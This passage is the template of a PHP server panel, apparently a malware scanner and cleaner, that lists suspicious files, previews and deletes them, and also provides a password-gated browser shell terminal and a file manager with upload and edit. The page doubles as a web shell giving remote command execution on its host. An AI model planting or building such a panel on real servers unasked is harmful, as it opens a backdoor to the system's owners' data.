.card-title{font-size:12px;font-weight:500;color:var(--color-text-primary);flex:1}
.card-body{padding:14px}
.btn{background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:5px 11px;font-size:11px;font-weight:500;cursor:pointer;color:var(--color-text-secondary);transition:border-color .15s,color .15s;font-family:var(--sans)}
.btn:hover{border-color:var(--green);color:var(--green)}
.btn.primary{background:var(--green-dim);border-color:var(--green);color:var(--green)}
.btn.danger:hover{border-color:var(--red);color:var(--red)}
.btn.sm{padding:3px 8px;font-size:10px}
.icon-btn{background:none;border:.5px solid var(--color-border-tertiary);border-radius:4px;padding:3px 7px;font-size:10px;cursor:pointer;color:var(--color-text-secondary);font-family:var(--mono);transition:all .15s;white-space:nowrap}
.icon-btn:hover{border-color:var(--green);color:var(--green)}
.icon-btn.red:hover{border-color:var(--red);color:var(--red)}
table{width:100%;border-collapse:collapse;font-size:11.5px}
th{text-align:left;padding:7px 14px;font-family:var(--mono);font-size:9px;font-weight:500;color:var(--color-text-tertiary);text-transform:uppercase;letter-spacing:.06em;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary);white-space:nowrap}
td{padding:8px 14px;border-bottom:.5px solid var(--color-border-tertiary);color:var(--color-text-secondary);vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:var(--color-background-secondary)}
.td-mono{font-family:var(--mono);font-size:10.5px}
.td-primary{color:var(--color-text-primary);font-weight:500}
.pill{display:inline-flex;align-items:center;gap:3px;padding:2px 7px;border-radius:8px;font-family:var(--mono);font-size:9px;font-weight:500}
.pill-green{background:var(--green-dim);color:var(--green);border:.5px solid var(--green)}
.pill-amber{background:rgba(245,158,11,.1);color:var(--amber);border:.5px solid var(--amber)}
.pill-red{background:rgba(239,68,68,.1);color:var(--red);border:.5px solid var(--red)}
.pill-gray{background:var(--color-background-secondary);color:var(--color-text-tertiary);border:.5px solid var(--color-border-tertiary)}
.metrics-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
.metric-card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:8px;padding:12px 14px}
.metric-label{font-size:10px;color:var(--color-text-tertiary);font-family:var(--mono);text-transform:uppercase;letter-spacing:.05em}
.metric-value{font-size:20px;font-weight:500;font-family:var(--mono);color:var(--color-text-primary);line-height:1.2;margin-top:2px}
.metric-sub{font-size:10px;color:var(--color-text-tertiary);margin-top:2px}
.metric-bar{height:2px;background:var(--color-background-tertiary);border-radius:2px;margin-top:8px;overflow:hidden}
.metric-bar-fill{height:100%;border-radius:2px;background:var(--green);transition:width .8s ease}
.metric-bar-fill.warn{background:var(--amber)}
.metric-bar-fill.danger{background:var(--red)}
.section-label{font-family:var(--mono);font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--color-text-tertiary);padding:2px 0}
.form-label{font-size:11px;color:var(--color-text-secondary);font-family:var(--mono);margin-bottom:4px;display:block}
.form-input{width:100%;background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:7px 10px;font-family:var(--mono);font-size:12px;color:var(--color-text-primary);outline:none}
.form-input:focus{border-color:var(--green)}
.preview-box{font-family:var(--mono);font-size:10px;background:var(--color-background-tertiary);border:.5px solid var(--color-border-tertiary);border-radius:5px;padding:8px 10px;white-space:pre-wrap;word-break:break-all;max-height:120px;overflow-y:auto;color:var(--color-text-secondary);line-height:1.6}
.status-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green-glow);flex-shrink:0}
.toast-area{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column;gap:6px;z-index:999}
.toast{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:7px;padding:8px 12px;font-size:11px;font-family:var(--mono);display:flex;align-items:center;gap:7px;box-shadow:0 4px 16px rgba(0,0,0,.1);animation:slide-in .2s ease;min-width:220px}
.toast.success{border-color:var(--green)}
.toast.error{border-color:var(--red)}
@keyframes slide-in{from{transform:translateX(16px);opacity:0}to{transform:none;opacity:1}}
::-webkit-scrollbar{width:3px;height:3px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--color-border-secondary);border-radius:3px}
input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-align:middle}
.empty-state{text-align:center;padding:32px 16px;color:var(--color-text-tertiary);font-family:var(--mono);font-size:11px}
.empty-icon{font-size:28px;margin-bottom:8px}
.ref-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.ref-card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:7px;padding:10px 12px;cursor:pointer;transition:border-color .15s}
.ref-card:hover{border-color:var(--green)}
.ref-module{font-family:var(--mono);font-size:9px;color:var(--green);margin-bottom:1px}
.ref-fn{font-family:var(--mono);font-size:10.5px;font-weight:500;color:var(--color-text-primary)}
.ref-desc{font-size:10px;color:var(--color-text-tertiary);margin-top:3px;line-height:1.4}
.ext-breakdown{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
.ext-count{display:inline-flex;align-items:center;gap:4px;font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:6px;border:.5px solid var(--color-border-tertiary)}
.term-shell{display:flex;flex-direction:column;flex:1;overflow:hidden;background:#0d0f0e}
.term-topbar{display:flex;align-items:center;gap:8px;padding:8px 14px;background:#111413;border-bottom:.5px solid #1e2420}
.term-dot{width:10px;height:10px;border-radius:50%}
.term-title{font-family:var(--mono);font-size:11px;color:#4a5a52;flex:1;text-align:center}
.term-body{flex:1;overflow-y:auto;padding:12px 16px;font-family:var(--mono);font-size:12px;line-height:1.8;color:#c2d6cc}
.term-line{display:flex;gap:0;flex-wrap:wrap;word-break:break-all}
.term-prompt{color:#00d084;flex-shrink:0;margin-right:8px;white-space:nowrap}
.term-cmd{color:#e2ede8}
.term-out{color:#8aab9a;white-space:pre-wrap;width:100%}
.term-out.err{color:#f87171}
.term-out.info{color:#60a5fa}
.term-out.warn{color:#fbbf24}
.term-input-row{display:flex;align-items:center;gap:8px;padding:8px 16px;background:#111413;border-top:.5px solid #1e2420;flex-shrink:0}
.term-prompt-inline{color:#00d084;font-family:var(--mono);font-size:12px;white-space:nowrap}
.term-input{flex:1;background:transparent;border:none;outline:none;font-family:var(--mono);font-size:12px;color:#e2ede8;caret-color:#00d084}
.term-method{font-family:var(--mono);font-size:9px;background:var(--green-dim);color:var(--green);border:.5px solid var(--green);border-radius:3px;padding:1px 5px;margin-left:auto;flex-shrink:0}
    </style>
</head>
<body>

<div class="shell">

<!-- TOPBAR -->
<div class="topbar">
    <div class="topbar-brand"><div class="brand-icon">MAW</div>TukangBersihBersih</div>
    <span style="color:var(--color-border-secondary);font-size:16px;margin:0 4px">|</span>
    <span style="font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary)">PATH</span>
    <form method="POST" style="display:flex;align-items:center;gap:6px;flex:1;max-width:460px">
        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
        <input class="conn-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="flex:1">
        <button type="submit" class="conn-btn">Scan</button>
    </form>
    <span class="status-dot"></span>
    <span style="font-family:var(--mono);font-size:10px;color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></span>
    <span style="margin-left:auto" class="tag">v2.1</span>
    <span class="pill <?php echo $total_threats > 0 ? 'pill-red' : 'pill-green'; ?>"><?php echo $total_threats; ?> threats</span>
</div>

<!-- SIDEBAR -->
<div class="sidebar">
    <div class="sidebar-heading">Overview</div>
    <div class="nav-item active" onclick="nav('dashboard',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><rect x="1" y="1" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="9" y="1" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="1" y="9" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="9" y="9" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/></svg>
        Dashboard
    </div>

    <div class="sidebar-heading" style="margin-top:4px">Scanner</div>
    <div class="nav-item" onclick="nav('dangerous',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M8 1L14 4.5V11.5L8 15L2 11.5V4.5L8 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M8 6V9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><circle cx="8" cy="11.5" r="0.8" fill="currentColor"/></svg>
        Dangerous Files
        <?php if ($dangerous_count > 0): ?><span class="nav-badge" style="background:rgba(239,68,68,.12);border-color:var(--red);color:var(--red)"><?php echo $dangerous_count; ?></span><?php endif; ?>
    </div>
    <div class="nav-item" onclick="nav('malware',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M8 1L14 4.5V11.5L8 15L2 11.5V4.5L8 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.2"/></svg>
        Malware
        <?php if ($malware_count > 0): ?><span class="nav-badge" style="background:rgba(239,68,68,.12);border-color:var(--red);color:var(--red)"><?php echo $malware_count; ?></span><?php endif; ?>
    </div>

    <div class="sidebar-heading" style="margin-top:4px">Tools</div>
    <div class="nav-item" onclick="nav('scan-dir',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="4.5" stroke="currentColor" stroke-width="1.2"/><line x1="10.2" y1="10.2" x2="14" y2="14" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
        Scan Directory
    </div>
    <div class="nav-item" onclick="nav('terminal',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><rect x="1" y="2" width="14" height="12" rx="2" stroke="currentColor" stroke-width="1.2"/><polyline points="4,6 7,9 4,12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><line x1="9" y1="12" x2="13" y2="12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
        Terminal
    </div>
    <div class="nav-item" onclick="nav('filemanager',this);fmLoad(fmCwd)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M2 4a1 1 0 011-1h3l1.5 2H13a1 1 0 011 1v6a1 1 0 01-1 1H3a1 1 0 01-1-1V4z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/></svg>
        File Manager
    </div>
    <?php if ($deleted_count > 0): ?>
    <div class="nav-item" onclick="nav('deleted',this)">
        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M3 4h10M5 4V3a1 1 0 011-1h4a1 1 0 011 1v1M6 7v5M10 7v5M12 4v9a1 1 0 01-1 1H5a1 1 0 01-1-1V4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
        Deleted
        <span class="nav-badge" style="background:var(--green-dim);border-color:var(--green);color:var(--green)"><?php echo $deleted_count; ?></span>
    </div>
    <?php endif; ?>
</div>

<!-- MAIN -->
<div class="main" id="main-content">

<!-- ══ DASHBOARD ══ -->
<div class="panel-section active" id="panel-dashboard">
<div class="scroll-y">
    <div class="metrics-grid">
        <div class="metric-card">
            <div class="metric-label">Scan Directory</div>
            <div class="metric-value" style="font-size:13px;word-break:break-all"><?php echo htmlspecialchars(basename($scan_dir)); ?></div>
            <div class="metric-sub" style="font-size:9px;word-break:break-all"><?php echo htmlspecialchars($scan_dir); ?></div>
            <div class="metric-bar"><div class="metric-bar-fill" style="width:0%" data-w="100"></div></div>
        </div>
        <div class="metric-card">
            <div class="metric-label">Malware</div>
            <div class="metric-value" style="color:<?php echo $malware_count > 0 ? 'var(--red)' : 'var(--green)'; ?>"><?php echo $malware_count; ?></div>
            <div class="metric-sub">pattern matches</div>
            <div class="metric-bar"><div class="metric-bar-fill <?php echo $malware_count > 0 ? 'danger' : ''; ?>" style="width:0%" data-w="<?php echo min($malware_count * 10, 100); ?>"></div></div>
        </div>
        <div class="metric-card">
            <div class="metric-label">Dangerous Files</div>
            <div class="metric-value" style="color:<?php echo $dangerous_count > 0 ? 'var(--amber)' : 'var(--green)'; ?>"><?php echo $dangerous_count; ?></div>
            <div class="metric-sub">suspicious extensions</div>
            <div class="metric-bar"><div class="metric-bar-fill <?php echo $dangerous_count > 0 ? 'warn' : ''; ?>" style="width:0%" data-w="<?php echo min($dangerous_count * 10, 100); ?>"></div></div>
            <?php if ($dangerous_count > 0): ?>
            <div class="ext-breakdown" style="margin-top:6px">
                <?php foreach ($ext_counts as $cat => $cnt): ?>
                    <?php if ($cnt > 0): ?>
                    <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?>: <?php echo $cnt; ?></span>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
        </div>
        <div class="metric-card">
            <div class="metric-label">Files Deleted</div>
            <div class="metric-value"><?php echo $deleted_count; ?></div>
            <div class="metric-sub">removed this session</div>
            <div class="metric-bar"><div class="metric-bar-fill" style="width:0%" data-w="<?php echo $deleted_count > 0 ? 50 : 0; ?>"></div></div>
        </div>
        <div class="metric-card">
            <div class="metric-label">Scan Time</div>
            <div class="metric-value"><?php echo $scan_elapsed; ?><?php if ($scan_timed_out): ?><span style="font-size:12px;color:var(--red)">s !</span><?php else: ?><span style="font-size:12px;color:var(--color-text-tertiary)">s</span><?php endif; ?></div>
            <div class="metric-sub"><?php echo $scan_timed_out ? 'timed out — partial results' : 'completed'; ?></div>
            <div class="metric-bar"><div class="metric-bar-fill <?php echo $scan_timed_out ? 'danger' : ''; ?>" style="width:0%" data-w="<?php echo min($scan_elapsed * 4, 100); ?>"></div></div>
        </div>
    </div>

    <div class="section-label">Quick Actions</div>
    <div class="ref-grid">
        <div class="ref-card" onclick="nav('malware',document.querySelectorAll('.nav-item')[3])">
            <div class="ref-module">Scanner::</div>
            <div class="ref-fn">Malware Results</div>
            <div class="ref-desc"><?php echo $malware_count > 0 ? $malware_count . ' suspicious file(s)' : 'No threats found'; ?></div>
        </div>
        <div class="ref-card" onclick="nav('dangerous',document.querySelectorAll('.nav-item')[2])">
            <div class="ref-module">Scanner::</div>
            <div class="ref-fn">Dangerous Files</div>
            <div class="ref-desc"><?php echo $dangerous_count > 0 ? $dangerous_count . ' dangerous file(s)' : 'No dangerous extensions'; ?></div>
        </div>
        <div class="ref-card" onclick="nav('scan-dir',document.querySelectorAll('.nav-item')[4])">
            <div class="ref-module">Scanner::</div>
            <div class="ref-fn">Change Directory</div>
            <div class="ref-desc">Scan a different path</div>
        </div>
        <?php if ($deleted_count > 0): ?>
        <div class="ref-card" onclick="nav('deleted',document.querySelectorAll('.nav-item')[5])">
            <div class="ref-module">Scanner::</div>
            <div class="ref-fn">Deleted Files</div>
            <div class="ref-desc"><?php echo $deleted_count; ?> file(s) removed</div>
        </div>
        <?php endif; ?>
    </div>

    <?php if ($dangerous_count > 0): ?>
    <div class="card">
        <div class="card-header"><span class="card-title">Dangerous Extensions Found</span><button class="btn sm" onclick="nav('dangerous',document.querySelectorAll('.nav-item')[2])">View All</button></div>
        <table>
            <thead><tr><th>File</th><th>Type</th><th>Size</th><th>Modified</th></tr></thead>
            <tbody>
                <?php foreach (array_slice($dangerous_files, 0, 5) as $df): ?>
                <tr>
                    <td class="td-primary td-mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?php echo htmlspecialchars($df['path']); ?></td>
                    <td><span class="pill pill-<?php echo $ext_severity[$df['cat']]; ?>"><?php echo $df['ext']; ?> <?php echo $ext_labels[$df['cat']]; ?></span></td>
                    <td class="td-mono"><?php echo formatSize($df['size']); ?></td>
                    <td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px"><?php echo $df['modified']; ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php endif; ?>

    <?php if ($malware_count > 0): ?>
    <div class="card">
        <div class="card-header"><span class="card-title">Recent Malware Detections</span><button class="btn sm" onclick="nav('malware',document.querySelectorAll('.nav-item')[3])">View All</button></div>
        <table>
            <thead><tr><th>File</th><th>Pattern</th><th>Size</th><th>Modified</th></tr></thead>
            <tbody>
                <?php foreach (array_slice($malware_hits, 0, 5) as $hit): ?>
                <tr>
                    <td class="td-primary td-mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?php echo htmlspecialchars($hit['path']); ?></td>
                    <td><span class="pill pill-red"><?php echo $hit['pattern']; ?></span></td>
                    <td class="td-mono"><?php echo formatSize($hit['size']); ?></td>
                    <td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px"><?php echo $hit['modified']; ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php endif; ?>

    <?php if (isset($error)): ?>
    <div class="card" style="border-color:var(--red)">
        <div class="card-body" style="color:var(--red);font-family:var(--mono);font-size:11px"><?php echo $error; ?></div>
    </div>
    <?php endif; ?>

    <?php if ($scan_timed_out): ?>
    <div class="card" style="border-color:var(--amber)">
        <div class="card-body" style="color:var(--amber);font-family:var(--mono);font-size:11px">Scan timed out after <?php echo $max_scan_seconds; ?>s. Results may be incomplete. Try scanning a more specific subdirectory.</div>
    </div>
    <?php endif; ?>

    <?php if ($scan_truncated && !$scan_timed_out): ?>
    <div class="card" style="border-color:var(--amber)">
        <div class="card-body" style="color:var(--amber);font-family:var(--mono);font-size:11px">Result limit (<?php echo $max_scan_results; ?>) reached. Some files may not be shown. Try scanning a more specific directory.</div>
    </div>
    <?php endif; ?>
</div>
</div>

<!-- ══ DANGEROUS FILES ══ -->
<div class="panel-section" id="panel-dangerous">
<div class="scroll-y">
<?php if (empty($dangerous_files)): ?>
    <div class="card">
        <div class="card-body">
            <div class="empty-state">
                <div class="empty-icon">&#10003;</div>
                No dangerous extension files found in <code style="color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></code><br>
                <span style="color:var(--color-text-tertiary);font-size:10px;margin-top:4px;display:block">Checked: <?php echo implode(', ', array_map(function($e){ return implode(', ', $e); }, $dangerous_extensions)); ?></span>
            </div>
        </div>
    </div>
<?php else: ?>
    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:4px">
        <?php foreach ($ext_counts as $cat => $cnt): ?>
            <?php if ($cnt > 0): ?>
            <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?> (.<?php echo $cat; ?>): <?php echo $cnt; ?></span>
            <?php endif; ?>
        <?php endforeach; ?>
    </div>

    <form method="POST">
        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
        <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
        <?php foreach ($dangerous_files as $i => $df): ?>
        <div class="card">
            <div class="card-header">
                <input type="checkbox" name="to_delete[]" value="<?php echo htmlspecialchars($df['path']); ?>" style="accent-color:var(--green);width:14px;height:14px;flex-shrink:0">
                <span class="card-title" style="font-family:var(--mono);font-size:10.5px"><?php echo htmlspecialchars($df['path']); ?></span>
                <span class="pill pill-<?php echo $ext_severity[$df['cat']]; ?>"><?php echo $df['ext']; ?> <?php echo $ext_labels[$df['cat']]; ?></span>
                <span class="pill pill-gray"><?php echo formatSize($df['size']); ?></span>
                <span style="font-family:var(--mono);font-size:9px;color:var(--color-text-tertiary)"><?php echo $df['modified']; ?></span>
                <button type="submit" name="delete_single" value="<?php echo htmlspecialchars($df['path']); ?>" class="icon-btn red" onclick="return confirm('Delete this file?')" style="margin-left:auto">delete</button>
            </div>
            <div style="padding:0"><div class="preview-box"><?php echo $df['preview']; ?></div></div>
        </div>
        <?php endforeach; ?>
        <div style="display:flex;align-items:center;gap:10px;padding:10px 0">
            <button type="submit" name="mass_delete" class="btn sm danger" onclick="return confirmDelete(this)">Delete Selected</button>
            <label style="display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary);cursor:pointer">
                <input type="checkbox" onchange="toggleAll(this,'to_delete[]')" style="accent-color:var(--green);width:12px;height:12px">Select all
            </label>
        </div>
    </form>
<?php endif; ?>
</div>
</div>

<!-- ══ MALWARE ══ -->
<div class="panel-section" id="panel-malware">
<div class="scroll-y">
<?php if (empty($malware_hits)): ?>
    <div class="card">
        <div class="card-body">
            <div class="empty-state">
                <div class="empty-icon">&#10003;</div>
                No malicious code found in <code style="color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></code>
            </div>
        </div>
    </div>
<?php else: ?>
    <form method="POST">
        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
        <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
        <?php foreach ($malware_hits as $i => $hit): ?>
        <div class="card">
            <div class="card-header">
                <input type="checkbox" name="to_delete[]" value="<?php echo htmlspecialchars($hit['path']); ?>" style="accent-color:var(--green);width:14px;height:14px;flex-shrink:0">
                <span class="card-title" style="font-family:var(--mono);font-size:10.5px"><?php echo htmlspecialchars($hit['path']); ?></span>
                <span class="pill pill-red"><?php echo $hit['pattern']; ?></span>
                <span class="pill pill-gray"><?php echo formatSize($hit['size']); ?></span>
                <span style="font-family:var(--mono);font-size:9px;color:var(--color-text-tertiary)"><?php echo $hit['modified']; ?></span>
                <button type="submit" name="delete_single" value="<?php echo htmlspecialchars($hit['path']); ?>" class="icon-btn red" onclick="return confirm('Delete this file?')" style="margin-left:auto">delete</button>
            </div>
            <div style="padding:0"><div class="preview-box"><?php echo $hit['preview']; ?></div></div>
        </div>
        <?php endforeach; ?>
        <div style="display:flex;align-items:center;gap:10px;padding:10px 0">
            <button type="submit" name="mass_delete" class="btn sm danger" onclick="return confirmDelete(this)">Delete Selected</button>
            <label style="display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary);cursor:pointer">
                <input type="checkbox" onchange="toggleAll(this,'to_delete[]')" style="accent-color:var(--green);width:12px;height:12px">Select all
            </label>
        </div>
    </form>
<?php endif; ?>
</div>
</div>

<!-- ══ TERMINAL ══ -->
<div class="panel-section" id="panel-terminal">
<div class="term-shell">
    <div class="term-topbar">
        <span class="term-dot" style="background:#ff5f57"></span>
        <span class="term-dot" style="background:#febc2e"></span>
        <span class="term-dot" style="background:#28c840"></span>
        <span class="term-title" id="term-title"><?php echo get_current_user(); ?>@<?php echo php_uname('n'); ?> — Shell</span>
        <button onclick="clearTerm()" style="background:none;border:.5px solid #2a3530;border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;color:#4a5a52;font-family:var(--mono)">clear</button>

    </div>
    <div class="term-body" id="term-body"></div>
    <div class="term-input-row">
        <span class="term-prompt-inline" id="term-prompt"><?php echo get_current_user(); ?>@<?php echo php_uname('n'); ?>:<?php echo htmlspecialchars($default_dir); ?>$</span>
        <input class="term-input" id="term-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type a command…" onkeydown="termKeydown(event)">
    </div>
</div>
</div>

<!-- ══ SCAN DIRECTORY ══ -->
<div class="panel-section" id="panel-scan-dir">
<div class="scroll-y">
    <div class="card">
        <div class="card-header"><span class="card-title">Change Scan Directory</span></div>
        <div class="card-body">
            <form method="POST">
                <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
                <label class="form-label">Directory Path</label>
                <input class="form-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="margin-bottom:12px">
                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='<?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? '/var/www/html'); ?>'">Document Root</button>
                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/home'">/home</button>
                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/tmp'">/tmp</button>
                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/var/www'">/var/www</button>
                </div>
                <button type="submit" class="conn-btn">Scan Directory</button>
            </form>
            <div style="margin-top:16px;font-size:10px;color:var(--color-text-tertiary);font-family:var(--mono)">
                Common paths:
                <code style="color:var(--color-text-secondary)">/var/www/html</code>,
                <code style="color:var(--color-text-secondary)">/home</code>,
                <code style="color:var(--color-text-tertiary)">/tmp</code>,
                <code style="color:var(--color-text-secondary)">/home/<?php echo get_current_user(); ?>/public_html</code>
            </div>
        </div>
    </div>

    <div class="section-label">Patterns Checked</div>
    <div class="card">
        <div class="card-header"><span class="card-title"><?php echo count($suspicious_patterns); ?> detection patterns</span></div>
        <div class="card-body" style="display:flex;flex-wrap:wrap;gap:4px">
            <?php foreach (array_slice($suspicious_patterns, 0, 30) as $p): ?>
            <span class="pill pill-gray"><?php echo htmlspecialchars($p); ?></span>
            <?php endforeach; ?>
            <?php if (count($suspicious_patterns) > 30): ?>
            <span class="pill pill-gray">+<?php echo count($suspicious_patterns) - 30; ?> more</span>
            <?php endif; ?>
        </div>
    </div>

    <div class="section-label">Dangerous Extensions Scanned</div>
    <div class="card">
        <div class="card-header"><span class="card-title"><?php echo count($dangerous_extensions); ?> extension types</span></div>
        <div class="card-body" style="display:flex;flex-wrap:wrap;gap:6px">
            <?php foreach ($dangerous_extensions as $cat => $exts): ?>
            <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?> (<?php echo implode(', ', $exts); ?>)</span>
            <?php endforeach; ?>
        </div>
    </div>
</div>
</div>

<!-- ══ FILE MANAGER ══ -->
<div class="panel-section" id="panel-filemanager">
<div style="display:flex;flex-direction:column;flex:1;overflow:hidden">
    <div style="display:flex;align-items:center;gap:8px;padding:10px 16px;background:var(--color-background-primary);border-bottom:.5px solid var(--color-border-tertiary);flex-shrink:0">
        <div id="fm-breadcrumb" style="flex:1;font-family:var(--mono);font-size:11px;color:var(--color-text-secondary);display:flex;align-items:center;gap:2px;flex-wrap:wrap;min-width:0"></div>
        <button class="btn sm" onclick="fmMkdir()">+ Folder</button>
        <button class="btn sm" onclick="fmMkfile()">+ File</button>
        <label class="btn sm" style="cursor:pointer;margin:0">Upload<input type="file" id="fm-upload-input" style="display:none" onchange="fmUpload(this)"></label>
    </div>
    <div style="overflow-y:auto;flex:1;padding:12px 16px">
        <div class="card">
            <table id="fm-table">
                <thead><tr>
                    <th style="width:28px"></th>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Modified</th>
                    <th style="text-align:right">Actions</th>
                </tr></thead>
                <tbody id="fm-tbody"><tr><td colspan="6" class="empty-state">Select File Manager to load.</td></tr></tbody>
            </table>
        </div>
    </div>
</div>
<!-- FM Editor Modal -->
<div id="fm-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:300;align-items:center;justify-content:center">
    <div style="background:var(--color-background-primary);border:.5px solid var(--color-border-secondary);border-radius:10px;width:92%;max-width:860px;max-height:88vh;display:flex;flex-direction:column;overflow:hidden">
        <div style="display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary);flex-shrink:0">
            <span id="fm-modal-title" style="font-family:var(--mono);font-size:11px;color:var(--color-text-primary);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Editor</span>
            <button class="btn sm primary" onclick="fmSaveFile()">Save</button>
            <button class="btn sm" onclick="fmCloseModal()">Close</button>
        </div>
        <textarea id="fm-editor" style="flex:1;min-height:380px;background:var(--color-background-tertiary);border:none;outline:none;font-family:var(--mono);font-size:12px;color:var(--color-text-primary);padding:14px;resize:none;line-height:1.7"></textarea>
    </div>
</div>
</div>

<?php if ($deleted_count > 0): ?>
<!-- ══ DELETED ══ -->
<div class="panel-section" id="panel-deleted">
<div class="scroll-y">
    <div class="card">
        <div class="card-header"><span class="card-title">Successfully Deleted</span><span class="pill pill-green"><?php echo $deleted_count; ?> files</span></div>
        <table>
            <thead><tr><th>File</th><th>Status</th></tr></thead>
            <tbody>
                <?php foreach ($deleted_files as $file): ?>
                <tr>
                    <td class="td-primary td-mono"><?php echo htmlspecialchars(basename($file)); ?></td>
                    <td><span class="pill pill-green">deleted</span></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
</div>
<?php endif; ?>

</div><!-- .main -->
</div><!-- .shell -->

<div class="toast-area" id="toast-area"></div>

<?php if ($deleted_count > 0): ?>
<script>
(function(){
    toast('success','<?php echo $deleted_count; ?> file(s) deleted successfully');
})();
</script>
<?php endif; ?>

<?php if (isset($error)): ?>
<script>
(function(){
    toast('error','<?php echo addslashes($error); ?>');
})();
</script>
<?php endif; ?>

<script>
function toggleAll(source,name){
    document.querySelectorAll('input[name="'+name+'"]').forEach(function(cb){
        cb.checked=source.checked;
    });
}

function confirmDelete(btn){
    var checked=document.querySelectorAll('input[name="to_delete[]"]:checked');
    if(checked.length===0){
        toast('error','Select files to delete first');
        return false;
    }
    return confirm('Are you sure you want to delete '+checked.length+' selected file(s)?');
}

function toast(type,msg){
    var area=document.getElementById('toast-area');
    var el=document.createElement('div');
    el.className='toast '+type;
    el.innerHTML=(type==='success'?'<span style="color:var(--green)">&#10003;</span>':'<span style="color:var(--red)">&#10007;</span>')+' '+msg;
    area.appendChild(el);
    setTimeout(function(){el.remove()},4000);
}

document.addEventListener('DOMContentLoaded',function(){
    setTimeout(function(){
        document.querySelectorAll('[data-w]').forEach(function(b){
            b.style.width=b.dataset.w+'%';
        });
    },400);
    termInit();
});

